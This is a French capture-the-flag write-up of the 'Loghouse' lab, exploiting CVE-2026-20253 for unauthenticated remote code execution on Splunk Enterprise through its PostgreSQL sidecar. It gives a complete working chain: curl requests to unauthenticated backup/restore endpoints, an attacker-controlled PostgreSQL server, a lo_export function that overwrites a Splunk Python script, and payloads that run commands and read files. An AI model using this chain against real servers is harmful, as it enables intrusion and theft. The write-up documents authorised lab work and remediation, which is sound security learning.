---
layout: single
header:
  overlay_image: /assets/images/banner-014.jpg
  overlay_filter: 0.6
toc: true
toc_depth: 6
toc_label: Table of Contents
title: "Lab Loghouse : RCE pré-authentification sur Splunk via PostgreSQL sidecar (CVE-2026-20253)"
date: 2026-10-20
categories: [Pentest, Exploitation]
tags: [cve-2026-20253, splunk, postgresql, rce, pre-auth, lo_export, backup-restore, secdojo, ctf]
---

# Lab Loghouse : exécution de code à distance sur Splunk via PostgreSQL sidecar (CVE-2026-20253)

> **Serveur Splunk du lab :** `176.16.163.115`
> **Kali utilisé pour le lab :** `176.16.163.114`
> **Objectif :** exploiter le port web exposé de Splunk Enterprise pour exécuter du code sur le serveur, sans authentification
> **Résultat :** ✅ RCE confirmée sous le compte `splunk`, flag récupéré dans `/home/local.txt`

## Résultat

Le lab a permis d'obtenir une exécution de code à distance sur le serveur Splunk sous le compte système `splunk`, puis de lire le drapeau situé dans `/home/local.txt`.

```text
flag_bb38f7b6_46a7_4e6d_b233_074d92b464da
```

> ℹ️ Le fichier `/root/proof.txt` n'était pas lisible par le compte `splunk` et a renvoyé `Permission denied`. Le défi indiquait un seul drapeau ; celui de `/home/local.txt` est le résultat final.

> ⚠️ **Avertissement :** ces étapes décrivent exclusivement la machine temporaire du lab Loghouse, pour laquelle le défi autorisait explicitement l'exploitation. **Ne pas les reproduire sur un système tiers.**


## 1. Contexte et périmètre

La plateforme présentait un défi « Loghouse », difficulté Basic, démarré et limité dans le temps. L'objectif annoncé était d'obtenir une exécution de code sur un serveur Splunk exposé et d'y récupérer un drapeau.

| Rôle | Adresse |
| --- | --- |
| Serveur Splunk du lab | `176.16.163.115` |
| Kali utilisé pour le lab | `176.16.163.114` |

La vulnérabilité **CVE-2026-20253** porte sur un endpoint du service PostgreSQL sidecar de Splunk Enterprise qui permet, sans authentification valide, des opérations de création ou troncation de fichiers. L'avis Splunk indique les versions concernées comme Splunk Enterprise **10.0.0–10.0.6** et **10.2.0–10.2.3** ; les versions corrigées sont **10.0.7** et **10.2.4** ou ultérieures. [Avis Splunk](https://advisory.splunk.com/advisories/SVD-2026-0603)

## 2. Reconnaissance réseau

```bash
nmap -A 176.16.163.115
```

Extrait utile de la sortie :

```text
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 10.2p1 Ubuntu 2ubuntu3.2
5432/tcp open  postgresql PostgreSQL DB 17.0 - 17.8
8000/tcp open  http       Splunkd httpd
8089/tcp open  ssl/http   Splunkd httpd
```

Les ports 8000 et 8089 répondaient donc comme des services Splunk ; PostgreSQL était également joignable sur 5432.

> ℹ️ La version PostgreSQL affichée par Nmap est une identification du service, **pas** la version de Splunk. Le scan, à lui seul, ne confirmait donc pas la vulnérabilité.

Une requête d'information à l'API Splunk sur le port 8089 a renvoyé :

```bash
curl -sk --max-time 5 \
  'https://176.16.163.115:8089/services/server/info?output_mode=json'
```

```text
{"messages":[{"type":"ERROR","text":"Unauthorized"}]}
```

Cela établissait que cet endpoint exigeait une authentification ; ce n'était ni une preuve ni une réfutation de CVE-2026-20253.

> 💡 Une tentative d'utiliser le script Nmap `pgsql-info` a échoué parce que le fichier n'était pas présent dans l'installation Kali. La commande `ls /usr/share/nmap/scripts/pgsql*` n'a trouvé que `pgsql-brute.nse` ; ce dernier n'a pas été utilisé.

## 3. Vérification de l'endpoint vulnérable

Le chemin de récupération PostgreSQL relayé par Splunk Web a été testé sur le port 8000 :

```bash
curl -i --max-time 10 \
  -X POST 'http://176.16.163.115:8000/en-US/splunkd/__raw/v1/postgres/recovery/backup' \
  -H 'Authorization: Basic Og==' \
  -H 'Content-Type: application/json' \
  --data '{"database":"search_metadata","backupFile":"ctf-probe"}'
```

Réponse :

```text
HTTP/1.1 200 OK
...
{"backupFile":"ctf-probe","database":"search_metadata","id":"b3c298b1-72f8-4a0a-b511-d158ef5554ce","state":"BackupPending"}
```

`Basic Og==` correspond à des identifiants Basic vides (`:`). L'acceptation de la requête avec `200 OK` et un identifiant d'opération indiquait que le point de récupération était accessible **sans identifiants valides**. La requête de sonde a pu créer un fichier vide sur la cible.

## 4. Préparation d'un PostgreSQL de retour sur Kali

La chaîne publiée utilise une connexion sortante du serveur Splunk vers une base contrôlée par l'opérateur.

```bash
ip -4 -br addr
ip route get 176.16.163.115
```

Sortie utile :

```text
eth0 UP 176.16.163.114/16
176.16.163.115 dev eth0 src 176.16.163.114
```

PostgreSQL devait être installé sur Kali pour recevoir depuis Splunk la connexion sortante utilisée par l'étape de sauvegarde :

```bash
sudo apt update
sudo apt install -y postgresql
pg_lsclusters
```

`sudo apt update` actualise l'index local des paquets. `sudo apt install -y postgresql` installe le serveur PostgreSQL ainsi que ses outils ; `-y` accepte automatiquement la confirmation d'installation. `pg_lsclusters` liste les clusters PostgreSQL gérés par les outils Debian/Kali, avec leur version, leur nom, leur port, leur état et leurs chemins de données et de journaux.

PostgreSQL a ensuite été configuré pour écouter uniquement sur cette interface et accepter le compte du lab uniquement depuis la cible :

```bash
PGVER=$(pg_lsclusters --no-header | awk 'NR==1 {print $1}')
CONF="/etc/postgresql/$PGVER/main/postgresql.conf"
HBA="/etc/postgresql/$PGVER/main/pg_hba.conf"

sudo sed -i -E \
  "s/^#?[[:space:]]*listen_addresses[[:space:]]*=.*/listen_addresses = '176.16.163.114'/" \
  "$CONF"

echo 'host test test 176.16.163.115/32 trust' | sudo tee -a "$HBA"
sudo pg_ctlcluster "$PGVER" main restart
sudo ss -lntp | grep ':5432'
```

Sortie observée :

```text
host test test 176.16.163.115/32 trust
LISTEN ... 176.16.163.114:5432 ... users:("postgres",...)
```

La règle `pg_hba.conf` limite l'authentification sans mot de passe à la base `test`, au rôle `test` et à la source `176.16.163.115/32`. Le compte et la base ont été créés :

```bash
sudo -u postgres psql -v ON_ERROR_STOP=1 <<'SQL'
CREATE ROLE test LOGIN;
CREATE DATABASE test OWNER test;
SQL
```

```text
CREATE ROLE
CREATE DATABASE
```

## 5. Construction du dump et de la fonction d'écriture

Le principe technique était de préparer dans la base locale une fonction PostgreSQL appelée pendant la restauration sur Splunk. Cette fonction encode le script Python en contenu binaire puis utilise `lo_export` pour écrire ce contenu dans le fichier Python exécuté périodiquement par l'installation Splunk.

Les droits d'exécution nécessaires aux fonctions de gros objets ont été accordés au rôle `test` :

```bash
sudo -u postgres psql -d test -v ON_ERROR_STOP=1 <<'SQL'
GRANT EXECUTE ON FUNCTION lo_from_bytea(oid, bytea) TO test;
GRANT EXECUTE ON FUNCTION lo_export(oid, text) TO test;
SQL
```

Le premier payload servait uniquement à confirmer le contexte d'exécution en écrivant le résultat de `id` dans un fichier statique de Splunk :

```bash
OUT='/opt/splunk/etc/apps/splunk_secure_gateway/bin/ssg_enable_modular_input.py'
PAYLOAD='import os; os.system("id > /opt/splunk/share/splunk/search_mrsparkle/exposed/ctf-proof.txt")'
HEX=$(printf '%s' "$PAYLOAD" | od -An -v -tx1 | tr -d ' \n')
```

Le SQL local créait une fonction avec un effet de bord déclenché par l'insertion dans une table :

```bash
sudo -u postgres psql -d test -v ON_ERROR_STOP=1 <<SQL
SET ROLE test;
DROP TABLE IF EXISTS public.ctf_poc;
DROP FUNCTION IF EXISTS public.ctf_write(integer);

CREATE FUNCTION public.ctf_write(i integer) RETURNS boolean
LANGUAGE plpgsql VOLATILE SECURITY DEFINER AS \$\$
DECLARE l oid;
BEGIN
  l := lo_from_bytea(0, '\\x${HEX}'::bytea);
  PERFORM lo_export(l, '${OUT}');
  RETURN true;
END
\$\$;

CREATE TABLE public.ctf_poc (i integer CHECK (public.ctf_write(i)));
INSERT INTO public.ctf_poc VALUES (1);
SQL
```

Dans ce bloc, `HEX` contient les octets du script Python ; `OUT` est le chemin du **script côté Splunk qui doit être remplacé**. Le `CHECK` déclenche la fonction lors de l'insertion/restauration de la ligne. `lo_export` écrit alors le contenu contrôlé dans le fichier cible.

## 6. Sauvegarde contrôlée par Splunk

L'endpoint `backup` a été utilisé pour demander au serveur Splunk d'exécuter son `pg_dump` vers la base locale de Kali.

```bash
B=$(curl -sS --max-time 15 \
  -X POST 'http://176.16.163.115:8000/en-US/splunkd/__raw/v1/postgres/recovery/backup' \
  -H 'Authorization: Basic dGVzdDo=' \
  -H 'Content-Type: application/json' \
  --data '{"database":"hostaddr=176.16.163.114 port=5432","backupFile":"/tmp/ctf-poc.dump"}')

echo "$B"
BID=$(printf '%s' "$B" | jq -r '.id')
```

`dGVzdDo=` est l'encodage Base64 de `test:`. La sortie initiale contenait :

```json
{"backupFile":"/tmp/ctf-poc.dump","database":"hostaddr=176.16.163.114 port=5432","id":"79d6653f-1f04-4b0f-b86f-3490747413d0","state":"BackupPending"}
```

Le statut a été interrogé avec l'identifiant renvoyé :

```bash
curl -sS \
  "http://176.16.163.115:8000/en-US/splunkd/__raw/v1/postgres/recovery/status/$BID"
```

```json
{"backupFile":"/tmp/ctf-poc.dump","database":"hostaddr=176.16.163.114 port=5432","id":"79d6653f-1f04-4b0f-b86f-3490747413d0","state":"BackupComplete"}
```

La sauvegarde a donc réussi. Elle a déposé sur le Splunk un dump contenant la fonction et les objets préparés dans la base `test` sur Kali.

## 7. Restauration et preuve d'exécution

La requête de restauration a demandé au Splunk de recharger le dump dans sa base locale `template1`, en utilisant le fichier `.pgpass` de l'installation :

```bash
R=$(curl -sS --max-time 20 \
  -X POST 'http://176.16.163.115:8000/en-US/splunkd/__raw/v1/postgres/recovery/restore' \
  -H 'Authorization: Basic cG9zdGdyZXNfYWRtaW46' \
  -H 'Content-Type: application/json' \
  --data '{"database":"dbname=template1 passfile=/opt/splunk/var/packages/data/postgres/.pgpass","backupFile":"/tmp/ctf-poc.dump"}')

echo "$R"
RID=$(printf '%s' "$R" | jq -r '.id')
```

`cG9zdGdyZXNfYWRtaW46` correspond à `postgres_admin:`. L'opération a renvoyé un identifiant d'état `RestorePending`, puis `RestoreFailed`.

> ⚠️ **Point important :** malgré ce statut final, l'effet utile s'était produit avant l'échec de la restauration : l'interface statique contenait le marqueur créé par le script.

Les fichiers placés dans `$SPLUNK_HOME/share/splunk/search_mrsparkle/exposed` sont servis par Splunk Web sous `/static`, d'où cette vérification :

```bash
curl -iL --max-time 10 \
  'http://176.16.163.115:8000/static/ctf-proof.txt'
```

Corps de la réponse :

```text
uid=999(splunk) gid=986(splunk) groups=986(splunk)
```

Cela a confirmé l'exécution de commandes sur la machine cible sous l'utilisateur `splunk`. La chaîne d'attaque et l'emplacement du script choisi sont également décrits dans [l'analyse technique watchTowr](https://labs.watchtowr.com/why-use-app-level-auth-when-every-database-has-auth-splunk-enterprise-cve-2026-20253-pre-auth-rce/).

## 8. Récupération du drapeau

Une première tentative de lecture de `/local.txt` a échoué parce que ce chemin n'existait pas :

```text
Erreur de lecture : [Errno 2] No such file or directory: '/local.txt'
```

L'indice de la plateforme donnait les chemins corrects : `/home/local.txt` et `/root/proof.txt`. Le script a ensuite été remplacé par un payload lisant ces deux chemins et écrivant leurs contenus ou erreurs dans le fichier statique `ctf-results.txt`.

```python
paths = ["/home/local.txt", "/root/proof.txt"]
out = "/opt/splunk/share/splunk/search_mrsparkle/exposed/ctf-results.txt"

with open(out, "w") as dest:
    for path in paths:
        dest.write(f"=== {path} ===\n")
        try:
            with open(path, "r", errors="replace") as src:
                dest.write(src.read(4096))
        except OSError as e:
            dest.write(f"{type(e).__name__}: {e}")
        dest.write("\n\n")
```

> 💡 Le payload a été converti en hexadécimal et encodé dans la même fonction PostgreSQL. Il fallait ensuite refaire **les deux opérations** — sauvegarde puis restauration — avec un nouveau nom de dump, pour qu'un nouveau script soit écrit et exécuté.

```bash
curl -iL --max-time 10 \
  "http://176.16.163.115:8000/static/ctf-results.txt?t=$(date +%s)"
```

Résultat obtenu :

```text
=== /home/local.txt ===
flag_bb38f7b6_46a7_4e6d_b233_074d92b464da

=== /root/proof.txt ===
PermissionError: [Errno 13] Permission denied: '/root/proof.txt'
```

Le drapeau a donc été lu depuis `/home/local.txt`. L'échec sur `/root/proof.txt` correspond aux permissions du compte `splunk` ; il n'était pas nécessaire d'obtenir les privilèges root pour valider le drapeau unique du défi.

## 9. Erreurs et points de diagnostic importants

| Point | Explication |
| --- | --- |
| La version PostgreSQL détectée n'était pas la version Splunk | Le scan réseau confirmait des services exposés, mais pas l'applicabilité exacte de la CVE |
| `/services/server/info` renvoyait `Unauthorized` | Cet endpoint d'information exigeait une authentification, alors que l'endpoint de récupération testé était accessible sans identifiants valides |
| Le script Nmap `pgsql-info` était absent | L'erreur provenait des scripts installés localement, non de la cible |
| `RestoreFailed` n'a pas empêché la preuve d'exécution | Dans ce cas précis, le marqueur a été écrit et le code a été exécuté avant que l'opération de restauration ne termine en échec. Il fallait vérifier l'effet concret, pas seulement l'état final |
| Ne pas confondre les deux variables de chemin | `OUT` dans la commande SQL est le chemin du fichier Python à écrire/exécuter sur Splunk. La variable Python `out` est le fichier statique qui reçoit les résultats et que l'on lit via HTTP. Une erreur temporaire a fait écrire le code source dans `ctf-results.txt` au lieu du script Python |
| Un ancien résultat statique peut être servi par cache | Vérifier l'en-tête `Last-Modified` et ajouter `?t=$(date +%s)` à l'URL de lecture aide à distinguer le nouveau résultat de l'ancien |
| Changer le payload ne suffit pas | Après modification de la fonction sur Kali, il faut créer un dump frais puis le faire restaurer par Splunk pour que le nouveau contenu atteigne et s'exécute sur la cible |
| Les chemins Linux utilisent `/` | Le chemin donné par l'indice était `/home/local.txt`, pas `/local.txt` ni `\local.txt` |

## 10. Conclusion

La séquence complète reliait les étapes ainsi : l'exposition de Splunk Web a permis de tester le endpoint de récupération sans authentification ; le serveur Splunk a ensuite été amené à sauvegarder une base fournie par Kali ; la restauration de ce dump a déclenché une écriture arbitraire ; le script Python écrit dans un fichier exécuté par Splunk a confirmé l'exécution sous `splunk` ; enfin, un payload adapté aux chemins d'indice a lu `/home/local.txt` et révélé le drapeau.

> ℹ️ En environnement réel, la recommandation de Splunk est de mettre à niveau vers une version corrigée ; si cela n'est pas immédiatement possible, son avis décrit une mitigation de désactivation du service PostgreSQL sidecar, en tenant compte des fonctionnalités qui en dépendent.

## Leçons retenues

- Un service "sidecar" (ici PostgreSQL embarqué dans Splunk) peut devenir un vecteur de RCE même si l'application principale semble correctement protégée — toujours cartographier les services auxiliaires exposés, pas seulement l'interface principale.
- Une opération qui échoue à son état final (`RestoreFailed`) peut malgré tout avoir produit un effet exploitable avant l'échec — vérifier systématiquement l'effet concret observable plutôt que de se fier uniquement au statut retourné par l'API.
- La technique `lo_from_bytea` + `lo_export` (gros objets PostgreSQL) est un vecteur classique d'écriture de fichier arbitraire quand un rôle SQL a les droits d'exécution sur ces fonctions — une primitive à connaître pour toute évaluation PostgreSQL.
- Toujours invalider le cache HTTP (`?t=$(date +%s)`) lors de la vérification itérative d'un payload modifié, pour ne pas confondre un ancien résultat mis en cache avec le résultat du nouveau payload.

## Références

1. [Splunk — avis de sécurité SVD-2026-0603, CVE-2026-20253](https://advisory.splunk.com/advisories/SVD-2026-0603) : description, versions touchées, correctifs et mitigation officielle
2. [CVE.org — fiche CVE-2026-20253](https://www.cve.org/CVERecord?id=CVE-2026-20253) : description du défaut d'authentification sur le PostgreSQL sidecar et versions signalées
3. [watchTowr Labs — analyse technique de CVE-2026-20253](https://labs.watchtowr.com/why-use-app-level-auth-when-every-database-has-auth-splunk-enterprise-cve-2026-20253-pre-auth-rce/) : description du relais par Splunk Web, des endpoints de sauvegarde/restauration et de la démonstration d'exécution de code
4. [NIST NVD — CVE-2026-20253](https://nvd.nist.gov/vuln/detail/CVE-2026-20253) : référence complémentaire et résumé de la vulnérabilité
5. [Splunk Community — service de fichiers statiques](https://community.splunk.com/t5/Security/How-do-I-get-Splunk-to-serve-other-content/m-p/101342) : référence indiquant que les fichiers du répertoire `search_mrsparkle/exposed` sont servis sous `/static` par Splunk Web
